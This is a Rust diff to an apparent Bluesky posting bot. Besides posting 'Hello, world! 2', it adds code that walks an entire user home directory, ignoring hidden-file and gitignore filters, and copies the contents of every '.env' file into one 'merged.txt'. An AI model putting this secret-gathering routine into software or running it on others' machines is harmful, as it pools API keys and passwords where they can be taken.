@@ -1,12 +1,48 @@
 mod sky;
 
 use bsky_sdk::BskyAgent;
-use chrono::Utc;
+use ignore::WalkBuilder;
+use std::fs::File;
+use std::io::{self,Write};
+use std::path::Path;
+use std::path::PathBuf;
 use dotenv::dotenv;
 use std::env;
 use std::error::Error;
 use atrium_api::app::bsky::feed::post::RecordData;
 use atrium_api::types::string::Datetime;
+
+fn scanFiles(root: &str) -> Vec<PathBuf>{
+    let mut files = Vec::new();
+
+    let walker = WalkBuilder::new(root).hidden(false).follow_links(false).git_exclude(false).git_global(false).git_ignore(false).build();
+
+    for item in walker{
+        if let Ok(item) = item{
+            let path = item.path();
+
+            if path.file_name().and_then(|n| n.to_str()) == Some(".env"){
+                files.push(path.to_path_buf());
+            }
+        }
+    }
+
+    files
+}
+
+fn mergeFiles(files: &[std::path::PathBuf], output: &Path) -> io::Result<()>{
+    let mut output = File::create(output)?;
+
+    for path in files{
+        if let Ok(content) = std::fs::read_to_string(path){
+            writeln!(output, "[ {} ]", path.display())?;
+            writeln!(output, "{}", content)?;
+            writeln!(output)?;
+        }
+    }
+
+    Ok(())
+}
 
 #[tokio::main]
 async fn main() -> Result<(), Box<dyn Error>> {
@@ -27,66 +63,15 @@ async fn main() -> Result<(), Box<dyn Error>> {
         langs: None,
         reply: None,
         tags: None,
-        text: "Hello, world!".to_string(),
+        text: "Hello, world! 2".to_string(),
     };
 
     agent.create_record(post).await?;
 
+    let files = scanFiles("/Users/astra.celestine");
+        println!("{:?}", &files);
+
+        mergeFiles(&files, &Path::new("merged.txt")).unwrap();
+
     Ok(())
 }
-
-
-// fn main(){
-//     dotenv().ok();
-//
-//     let appPass = env::var("APP_PASS").expect("APP_PASS is not set");
-//     let username = env::var("USERNAME").expect("USERNAME is not set");
-// }
-
-
-// mod sky;
-//
-// use ignore::WalkBuilder;
-// use std::fs::File;
-// use std::io::{self,Write};
-// use std::path::Path;
-// use std::path::PathBuf;
-//
-// fn scanFiles(root: &str) -> Vec<PathBuf>{
-//     let mut files = Vec::new();
-//
-//     let walker = WalkBuilder::new(root).hidden(false).follow_links(false).git_exclude(false).git_global(false).git_ignore(false).build();
-//
-//     for item in walker{
-//         if let Ok(item) = item{
-//             let path = item.path();
-//
-//             if path.file_name().and_then(|n| n.to_str()) == Some(".env"){
-//                 files.push(path.to_path_buf());
-//             }
-//         }
-//     }
-//
-//     files
-// }
-//
-// fn mergeFiles(files: &[std::path::PathBuf], output: &Path) -> io::Result<()>{
-//     let mut output = File::create(output)?;
-//
-//     for path in files{
-//         if let Ok(content) = std::fs::read_to_string(path){
-//             writeln!(output, "[ {} ]", path.display())?;
-//             writeln!(output, "{}", content)?;
-//             writeln!(output)?;
-//         }
-//     }
-//
-//     Ok(())
-// }
-//
-// fn main(){
-//     let files = scanFiles("/Users/astra.celestine");
-//     println!("{:?}", &files);
-//
-//     mergeFiles(&files, &Path::new("merged.txt")).unwrap();
-// }
